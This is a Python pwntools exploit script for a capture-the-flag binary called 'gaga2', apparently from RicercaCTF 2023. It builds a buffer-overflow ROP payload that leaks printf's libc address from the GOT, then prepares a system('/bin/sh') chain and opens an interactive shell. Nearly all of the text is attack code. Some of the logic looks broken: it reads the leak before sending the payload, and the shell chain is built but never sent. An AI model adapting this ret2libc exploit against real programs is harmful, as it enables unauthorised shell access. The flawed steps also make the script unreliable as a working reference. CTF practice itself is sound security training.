from pwn import *
elf_file = FILENAME = './gaga2'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


'''
HOST = 'bofsec.2023.ricercactf.com'
POST = 9001
#libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b main''')


prdi = 0x004012b3
printf_plt = 0x4010c0
printf_got = 0x404030
ret = 0x0040101a
payload = b'\x00'*0x48
payload += p64(ret)
payload += p64(prdi)
payload += p64(printf_got)
payload += p64(printf_plt)
payload += p64(ret)
payload += p64(libc.sym['main']+0x3)


leak = c.recvuntil(b'\x7f') + b'\x00\x00'
leak = u64(leak)
libc.address = leak - libc.sym['printf']
sleep(0.5)

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh'),0))
print(rop.dump())
c.sendlineafter(b'Your input: ',payload)
c.interactive()